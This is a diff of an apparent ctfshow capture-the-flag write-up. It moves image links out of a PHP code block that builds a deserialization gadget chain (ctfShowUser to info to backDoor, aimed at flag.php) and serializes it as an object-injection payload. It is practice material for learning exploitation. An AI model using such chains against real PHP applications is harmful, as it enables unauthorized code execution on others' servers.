@@ -84,6 +84,25 @@
 
 ![](img/23fcac741fae3115ad8c50754e87ffea_42.png)
 
+
+![](img/23fcac741fae3115ad8c50754e87ffea_44.png)
+
+![](img/23fcac741fae3115ad8c50754e87ffea_46.png)
+
+
+![](img/23fcac741fae3115ad8c50754e87ffea_48.png)
+
+![](img/23fcac741fae3115ad8c50754e87ffea_50.png)
+
+![](img/23fcac741fae3115ad8c50754e87ffea_52.png)
+
+
+![](img/23fcac741fae3115ad8c50754e87ffea_53.png)
+
+![](img/23fcac741fae3115ad8c50754e87ffea_55.png)
+
+![](img/23fcac741fae3115ad8c50754e87ffea_57.png)
+
 ```php
 <?php
 class ctfShowUser{
@@ -96,24 +115,12 @@ class ctfShowUser{
         $this->class = new info();
     }
 }
-
-![](img/23fcac741fae3115ad8c50754e87ffea_44.png)
-
-![](img/23fcac741fae3115ad8c50754e87ffea_46.png)
-
 class info{
     public $user = 'xxxxxx';
     public function __construct(){
         $this->user = new backDoor();
     }
 }
-
-![](img/23fcac741fae3115ad8c50754e87ffea_48.png)
-
-![](img/23fcac741fae3115ad8c50754e87ffea_50.png)
-
-![](img/23fcac741fae3115ad8c50754e87ffea_52.png)
-
 class backDoor{
     public $code;
     public function __construct(){
@@ -123,13 +130,6 @@ class backDoor{
         $this->filename = "/var/www/html/flag.php"; // 使用绝对路径更可靠
     }
 }
-
-![](img/23fcac741fae3115ad8c50754e87ffea_53.png)
-
-![](img/23fcac741fae3115ad8c50754e87ffea_55.png)
-
-![](img/23fcac741fae3115ad8c50754e87ffea_57.png)
-
 $obj = new ctfShowUser();
 echo serialize($obj);
 ?>
